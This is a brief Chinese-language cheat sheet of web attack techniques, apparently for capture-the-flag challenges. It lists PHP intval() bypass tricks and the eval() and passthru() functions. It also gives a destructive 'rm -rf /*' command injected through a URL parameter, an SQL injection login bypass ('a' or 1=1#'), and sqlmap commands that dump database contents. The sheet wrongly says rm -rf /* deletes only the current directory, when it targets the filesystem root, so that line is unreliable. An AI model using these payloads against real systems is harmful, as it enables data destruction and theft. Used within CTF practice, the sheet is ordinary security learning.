    WEB

    常见函数:

    intval()

    intval()函数是获取变量的整型值，当它获取的变量不能被转换时返回“0”；

    如果字符串其中有数字，则返回数字；如果开头无法转换则返回0.

    绕过方式:

    • 两次取反: ~~val

    • 转二进制: 0bxxxxxxx

    eval()

    eval()函数用来执行一个字符串表达式，并返回表达式的值.

    passthru()

    与system()类似，区别在于passthru直接在浏览器输出.

    常见指令:

    rm -rf /*

    删除当前目录下所有文件。

    常见使用：?val=rm -rf /*

    SQL注入:

    **万能密码: **

    ​ a' or 1=1#

    **sqlmap使用: **

    • python sqlmap.py -u 题目地址?(必备参数) 测试.
    • python sqlmap.py -u 题目地址?(必备参数) --dbs 得到库名.
    • python sqlmap.py -u 题目地址?(必备参数) -D 指定库名 --tables 得到指定库中的表名.
    • python sqlmap.py -u 题目地址?(必备参数) -D 指定库名 -T 指定表名 --columns 得到指定库中指定表中的字段名.
    • python sqlmap.py -u 题目地址?(必备参数) -D 指定库名 -T 指定表名 -C 指定字段名 --dump 得到指定库中指定表中指定字段中的数据.
